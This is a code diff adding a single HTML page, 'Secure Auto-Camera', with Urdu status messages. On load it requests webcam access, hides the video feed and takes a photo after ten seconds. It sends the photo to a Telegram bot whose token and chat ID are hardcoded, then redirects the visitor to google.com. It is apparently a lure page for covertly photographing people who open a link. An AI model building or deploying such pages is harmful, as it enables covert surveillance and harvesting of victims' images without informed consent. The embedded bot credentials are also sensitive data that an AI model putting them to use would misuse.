@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Secure Auto-Camera</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 30px; background: #f8f8f8; }
+    #status { margin-top: 20px; font-size: 18px; color: #333; }
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+  <h2>📷 Picture Capture In Progress</h2>
+  <p>آپ کی تصویر محفوظ طریقے سے کیپچر کی جا رہی ہے...</p>
+  <div id="status">🔄 انتظار کریں، تصویر لی جا رہی ہے...</div>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const BOT_TOKEN = "8229410666:AAHURN6Ie9iqAm0hjPqC2p_XgzeMCLrtgqE";
+    const CHAT_ID = "7009447523";
+    const REDIRECT_URL = "https://google.com";
+    const CAPTURE_DELAY = 10000;
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const statusDiv = document.getElementById("status");
+    const context = canvas.getContext("2d");
+
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+      for (let i = 0; i < n; i++) {
+        u8arr[i] = bstr.charCodeAt(i);
+      }
+      return new Blob([u8arr], { type: mime });
+    }
+
+    function sendToTelegram(imageDataUrl) {
+      const blob = dataURLtoBlob(imageDataUrl); // ✅ FIXED HERE
+
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, "photo.jpg");
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData,
+      }).then(response => {
+        if (response.ok) {
+          statusDiv.innerText = "✅ تصویر Telegram پر بھیج دی گئی ہے!";
+        } else {
+          statusDiv.innerText = "❌ تصویر بھیجنے میں مسئلہ آیا!";
+        }
+
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 2000);
+      }).catch(() => {
+        statusDiv.innerText = "⚠️ نیٹ ورک ایرر!";
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 2000);
+      });
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          video.play();
+          statusDiv.innerText = `📸 10 سیکنڈ بعد تصویر لی جائے گی...`;
+
+          setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL("image/jpeg");
+            statusDiv.innerText = "⏳ تصویر لی گئی، بھیجی جا رہی ہے...";
+            sendToTelegram(imageData);
+          }, CAPTURE_DELAY);
+        };
+      })
+      .catch(error => {
+        statusDiv.innerText = "❌ کیمرہ پرمیشن نہیں ملی!";
+      });
+  </script>
+</body>
+</html>
